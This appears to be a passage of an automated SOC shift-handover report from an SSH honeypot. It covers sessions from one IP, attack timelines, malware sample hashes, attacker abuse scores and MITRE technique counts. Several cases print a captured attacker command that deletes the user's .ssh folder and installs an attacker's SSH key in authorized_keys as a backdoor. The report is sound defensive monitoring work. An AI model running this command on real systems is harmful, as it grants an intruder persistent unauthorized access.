| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:54:53` | `cowrie.session.connect` |
| `2026-04-23 18:54:53` | `cowrie.client.version` |
| `2026-04-23 18:54:53` | `cowrie.client.kex` |
| `2026-04-23 18:54:54` | `cowrie.login.success` |
| `2026-04-23 18:54:55` | `cowrie.session.params` |
| `2026-04-23 18:54:55` | `cowrie.command.input` |
| `2026-04-23 18:54:55` | `cowrie.command.failed` |
| `2026-04-23 18:54:55` | `cowrie.log.closed` |
| `2026-04-23 18:54:56` | `cowrie.session.params` |
| `2026-04-23 18:54:56` | `cowrie.command.input` |
| `2026-04-23 18:54:56` | `cowrie.session.file_download` |
| `2026-04-23 18:54:56` | `cowrie.log.closed` |
| `2026-04-23 18:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e697ce670d2e

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:54 |
| **Last Seen** | 2026-04-23 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:54:59` | `cowrie.session.connect` |
| `2026-04-23 18:54:59` | `cowrie.client.version` |
| `2026-04-23 18:55:00` | `cowrie.client.kex` |
| `2026-04-23 18:55:01` | `cowrie.login.success` |
| `2026-04-23 18:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a0b11f9b81

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:55 |
| **Last Seen** | 2026-04-23 18:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:55:49` | `cowrie.session.connect` |
| `2026-04-23 18:55:49` | `cowrie.client.version` |
| `2026-04-23 18:55:50` | `cowrie.client.kex` |
| `2026-04-23 18:55:51` | `cowrie.login.success` |
| `2026-04-23 18:55:51` | `cowrie.session.params` |
| `2026-04-23 18:55:51` | `cowrie.command.input` |
| `2026-04-23 18:55:51` | `cowrie.command.failed` |
| `2026-04-23 18:55:52` | `cowrie.log.closed` |
| `2026-04-23 18:55:52` | `cowrie.session.params` |
| `2026-04-23 18:55:52` | `cowrie.command.input` |
| `2026-04-23 18:55:53` | `cowrie.session.file_download` |
| `2026-04-23 18:55:53` | `cowrie.log.closed` |
| `2026-04-23 18:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b13b7909feb1

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:55 |
| **Last Seen** | 2026-04-23 18:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:55:56` | `cowrie.session.connect` |
| `2026-04-23 18:55:56` | `cowrie.client.version` |
| `2026-04-23 18:55:56` | `cowrie.client.kex` |
| `2026-04-23 18:55:58` | `cowrie.login.success` |
| `2026-04-23 18:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e912ec4d029f

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:56 |
| **Last Seen** | 2026-04-23 18:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:56:48` | `cowrie.session.connect` |
| `2026-04-23 18:56:48` | `cowrie.client.version` |
| `2026-04-23 18:56:48` | `cowrie.client.kex` |
| `2026-04-23 18:56:49` | `cowrie.login.success` |
| `2026-04-23 18:56:50` | `cowrie.session.params` |
| `2026-04-23 18:56:50` | `cowrie.command.input` |
| `2026-04-23 18:56:50` | `cowrie.command.failed` |
| `2026-04-23 18:56:50` | `cowrie.log.closed` |
| `2026-04-23 18:56:51` | `cowrie.session.params` |
| `2026-04-23 18:56:51` | `cowrie.command.input` |
| `2026-04-23 18:56:51` | `cowrie.session.file_download` |
| `2026-04-23 18:56:51` | `cowrie.log.closed` |
| `2026-04-23 18:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43a41a5c3c66

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:56 |
| **Last Seen** | 2026-04-23 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:56:54` | `cowrie.session.connect` |
| `2026-04-23 18:56:54` | `cowrie.client.version` |
| `2026-04-23 18:56:55` | `cowrie.client.kex` |
| `2026-04-23 18:56:56` | `cowrie.login.success` |
| `2026-04-23 18:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `189.194.140[.]170` | **27** | 2026-04-23 18:27 | 2026-04-23 18:57 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `1.71.143[.]145` | **23** | 2026-04-23 18:21 | 2026-04-23 18:33 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `101.126.54[.]167` | **12** | 2026-04-23 17:41 | 2026-04-23 18:11 | 20m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.172[.]156` | 1 | 2026-04-23 18:35 | 2026-04-23 18:37 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `1.71.143[.]145` | CN | CHINANET SHANXI PROVINCE NETWORK | **100** ⚠️ | 8 |
| `180.76.172[.]156` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `101.126.54[.]167` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `189.194.140[.]170` | MX | Mega Cable, S.A. de C.V. | **100** ⚠️ | 0 |
| `172.104.31[.]133` | US | Linode | 15 | 0 |
| `20.81.183[.]85` | US | Microsoft Corporation | 12 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 124 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 30 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |

---

## 🔕 False Positive Summary (57 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 55 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 150 cases |
| Tool 34  | Credential Extractor        | ✅ 58 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 7 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 57 filtered (38.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 7 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 30 priority case(s) shown individually · 4 recon entry/entries in table (3 group(s) consolidating 62 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-23T19:17:40Z_
